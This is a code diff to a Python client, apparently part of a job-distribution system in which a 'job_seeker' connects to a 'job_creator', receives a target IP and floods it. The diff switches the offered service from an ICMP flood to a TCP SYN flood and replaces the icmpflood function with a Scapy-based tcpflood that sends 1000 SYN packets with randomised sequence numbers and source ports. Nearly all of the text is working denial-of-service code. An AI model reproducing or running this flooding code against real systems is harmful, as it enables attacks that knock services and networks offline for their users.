@@ -20,8 +20,8 @@ def seeker_program():
     print("job_creator: My IP;UID is " + str(data))  # show in terminal
 
 # types of jobs/services: 1=ICMP flood, 2=TCP flood, 3=Craft and Send TCP packet
-    service = bytes([1])
-    print("job_seeker: I am offering ICMP flood service")
+    service = bytes([2])
+    print("job_seeker: I am offering TCP flood service")
     client_socket.send(service)    # send service/skill
     data = int.from_bytes(client_socket.recv(1), "big")    # receive job or no job available
     if data == 1:
@@ -37,7 +37,7 @@ def seeker_program():
         # print('\n' + data + '\n')
         print("job_creator: Job data sent\n")
 
-        icmpflood(data)
+        tcpflood(data)
 
         client_socket.close()  # close the connection
 
@@ -62,11 +62,15 @@ def seeker_program():
         print("job_creator: I do not have corresponding job " + str(int.from_bytes(service, "big")))
         client_socket.close()  # close the connection
 
-def icmpflood(target):
+def tcpflood(target):
+    # targetPort = destinationPort()
     cycle = 1000
 
-    for x in range (0,int(cycle)):
-        send(IP(dst=target)/ICMP())
+    for x in range(0, int(cycle)):
+        send(IP(dst=target)/TCP(flags="S",
+                                seq=RandShort(),
+                                ack=RandShort(),
+                                sport=RandShort()))
 
 if __name__ == '__main__':
     seeker_program()
